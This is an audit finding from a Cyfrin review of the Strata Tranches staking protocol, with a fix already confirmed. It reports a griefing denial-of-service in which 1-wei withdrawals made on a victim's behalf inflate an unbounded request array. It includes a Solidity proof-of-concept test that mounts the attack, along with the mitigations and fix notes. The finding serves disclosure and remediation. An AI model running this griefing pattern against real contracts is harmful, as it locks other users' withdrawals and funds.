---
tags:
  - lang/solidity
  - sector/staking
  - platform/cyfrin
  - has/github
  - has/poc
  - severity/high
  - vuln/dos/griefing
  - vuln/dos/unbounded-loop
  - fix/add-access-control
  - novelty/known-pattern
protocol: "[[Strata]]"
auditors:
  - "[[InAllHonesty]]"
report: "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-10-08-cyfrin-strata-tranches-v2.0.md"
genome:
  - "[[griefing]]"
  - "[[unbounded-loop]]"
  - "[[temporary]]"
  - "[[add-access-control]]"
  - "[[known-pattern]]"
  - "[[access-roles]]"
  - "[[dos-resistance]]"
---
# Users can get their withdrawal active requests DoSed by malicious users

- id: 63223
- impact: HIGH
- protocol: [[Strata]] Tranches
- reporter: InAllHonesty (Cyfrin)
- source: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-10-08-cyfrin-strata-tranches-v2.0.md

## Summary


The bug report describes a problem where malicious users can cause a denial of service (DoS) attack on other users' active withdrawal requests. This is achieved by withdrawing a small amount of assets and setting the receiver as the victim user. The attack can cause the victim's assets to get stuck in the system. The bug is caused by a lack of access control and validation in the withdrawal process. A proof of concept is provided to demonstrate how the attack can be carried out. The recommended mitigation includes implementing access control and setting limits on the number of requests that can be made. The bug has been fixed in the code by adding access control and implementing limits. 

## Details

**Description:** Users can opt to withdraw either `USDe` or `sUSDe`.
- When withdrawing `sUSDe`, the assets can be put on a cooldown period depending on the Tranche from which the withdrawal is requested.
- When withdrawing `USDe`, regardless of the Tranche from which the withdrawal is requested, a new withdrawal request will be created on the `UnstakeCooldown` contract because to receive `USDe`, it is required to unstake `sUSDe` on the Ethena contract.

The problem this issue reports is a grief attack that allows malicious users to cause a DoS to other users' active withdrawal requests, effectively causing their assets to get stuck on the system.

The grief attack is achieved by withdrawing as low as 1 wei and setting the `receiver` as the victim user that the attacker wants to damage.
Given that neither the `Tranche` nor the `CDO` nor the `Strategy` contracts validate if the withdrawer is authorized by the `receiver` to request withdrawals on their behalf, this allows anybody to make new withdrawal requests on behalf of anybody.
- Each new withdrawal request is pushed to an array on the `UnstakingContract`, which, once the cooldown period is over, the `UnstakingContract.finalize()` iterates over such an array to process all the ready requests. The attack inflates this array to a point that causes an `out of gas error` because of iterating over thousands of active requests (inflated by an attacker).

Since the unstaking contracts lack access control, an alternative approach is to directly call the `request()` method of the unstaking contracts. This allows circumventing the system's core contracts and directly inflating the user's withdrawal requests on the unstaking contracts.

```solidity
    function transfer(IERC20 token, address to, uint256 amount) external {
@>      address from = msg.sender;
        ...
        SafeERC20.safeTransferFrom(token, from, address(proxy), amount);
        ...

@>      requests.push(TRequest(uint64(unlockAt), proxy));
        emit Requested(address(token), to, amount, unlockAt);
    }

```

**Impact:** Malicious users can cause a DoS for other users to complete the withdrawal of their assets when they are withdrawing USDe via the UnstakeCooldown contract.

**Proof of Concept:** Add the next PoC on the `CDO.t.sol` file.
The PoC demonstrates how a malicious user can fully DoS the withdrawal of active requests for another user by requesting a huge amount of withdrawals for as low as one wei. As a result, a malicious user can fully DoS the active withdrawals for a small amount of resources, mostly covering the gas costs.

```solidity
    function test_DoSUserActiveRequests() public {
        address alice = makeAddr("Alice");
        address bob = makeAddr("Bob");

        uint256 initialDeposit = 1000 ether;
        USDe.mint(alice, initialDeposit);
        USDe.mint(bob, initialDeposit);

        vm.startPrank(alice);
        USDe.approve(address(jrtVault), type(uint256).max);
        jrtVault.deposit(initialDeposit, alice);
        vm.stopPrank();

        vm.startPrank(bob);
        USDe.approve(address(jrtVault), type(uint256).max);
        jrtVault.deposit(initialDeposit, bob);
        vm.stopPrank();

        //@audit => Alice requests to withdraw its full USDe balance
        uint256 totalWithdrawableAssets = jrtVault.maxWithdraw(alice);
        vm.prank(alice);
        jrtVault.withdraw(totalWithdrawableAssets, alice, alice);

        //@audit => Bob does a huge amount of tiny withdrawals to inflate the activeRequests array of Alice
        vm.pauseGasMetering();
            for(uint i = 0; i < 35_000; i++) {
                vm.prank(bob);
                jrtVault.withdraw(1, alice, bob);
            }
        vm.resumeGasMetering();

        //@audit-info => Skip till a timestamp where the requests can be finalized
        skip(1_000_000);

        //@audit-issue => Alice gets DoS her tx to finalize the withdrawal of her USDe balance
        vm.prank(alice);
        unstakeCooldown.finalize(sUSDe, alice);
    }
```

**Recommended Mitigation:** A combination of a minimum withdrawal amount and a permission mechanism to allow users to specify who can request new withdrawals on their behalf.

In addition to the above mitigations, restrict who can call the `transfer()` on the `UnstakeCooldown` and `ERC20Cooldown` contracts. If anybody can call the `transfer()` function, the mitigations mentioned previously can be circumvented by directly calling the `transfer()` on any of the two Cooldown contracts.

**Strata:**
Fixed in commits ea7371d, da327dc, and, 9b5ac62 by:
1. Adding access control to `UnstakeCooldown::transfer` and `ERC20Cooldown::transfer`.
2. Setting a soft limit for requests created by an account other than the receiver, and a hard limit for requests created by the actual receiver. Once the hard limit is reached, any subsequent request is added to the last request on the list.

**Cyfrin:** Verified. Implemented access control to prevent grief by calling functions directly. Implemented limits to prevent unauthorized users from spamming fake requests and filling up the withdrawer's requests queue.
